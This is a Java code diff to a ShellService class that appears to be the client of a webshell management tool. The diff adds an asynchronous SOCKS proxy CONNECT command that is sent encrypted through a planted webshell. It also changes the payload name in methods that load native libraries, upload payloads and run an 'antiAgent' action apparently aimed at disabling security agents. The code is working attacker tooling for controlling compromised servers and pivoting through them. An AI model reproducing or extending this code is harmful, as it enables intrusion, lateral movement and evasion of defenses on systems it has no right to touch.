@@ -1122,6 +1122,34 @@ public class ShellService {
       }
    }
 
+   public boolean openProxyAsyc(String destHost, String destPort, String socketHash) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("cmd", "CONNECT");
+      params.put("targetIP", destHost);
+      params.put("targetPort", destPort);
+      params.put("socketHash", socketHash);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
+      Runnable backgroundRunner = () -> {
+         Map result = null;
+
+         try {
+            result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+         } catch (Exception var5) {
+            var5.printStackTrace();
+         }
+
+         Map resHeader = (Map)result.get("header");
+         byte[] resData = (byte[])((byte[])result.get("data"));
+         if (((String)resHeader.get("status")).equals("200") && resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
+            resData = Arrays.copyOfRange(resData, 4, resData.length);
+            System.out.println("openProxyAsyc failed:" + new String(resData));
+         }
+
+      };
+      (new Thread(backgroundRunner)).start();
+      return true;
+   }
+
    public JSONObject echo(String content) throws Exception {
       Map params = new LinkedHashMap();
       params.put("content", content);
@@ -1240,7 +1268,7 @@ public class ShellService {
       params.put("action", "load");
       params.put("whatever", Utils.getWhatever());
       params.put("libraryPath", libraryPath);
-      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
@@ -1261,7 +1289,7 @@ public class ShellService {
       params.put("whatever", Utils.getWhatever());
       params.put("uploadLibPath", uploadLibPath);
       params.put("payload", payload);
-      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
@@ -1282,7 +1310,7 @@ public class ShellService {
       params.put("whatever", Utils.getWhatever());
       params.put("fileContent", fileContent);
       params.put("payload", payload);
-      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
@@ -1303,7 +1331,7 @@ public class ShellService {
       params.put("whatever", Utils.getWhatever());
       params.put("fileContent", fileContent);
       params.put("filePath", filePath);
-      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
@@ -1324,7 +1352,7 @@ public class ShellService {
       params.put("whatever", Utils.getWhatever());
       params.put("uploadLibPath", uploadLibPath);
       params.put("filePath", filePath);
-      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
@@ -1344,7 +1372,7 @@ public class ShellService {
       params.put("action", "antiAgent");
       params.put("whatever", Utils.getWhatever());
       params.put("fileContent", fileContent);
-      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
@@ -1364,7 +1392,7 @@ public class ShellService {
       params.put("action", "antiAgent");
       params.put("whatever", Utils.getWhatever());
       params.put("uploadLibPath", uploadLibPath);
-      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
@@ -1383,7 +1411,7 @@ public class ShellService {
       Map params = new LinkedHashMap();
       params.put("action", "test");
       params.put("whatever", Utils.getWhatever());
-      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
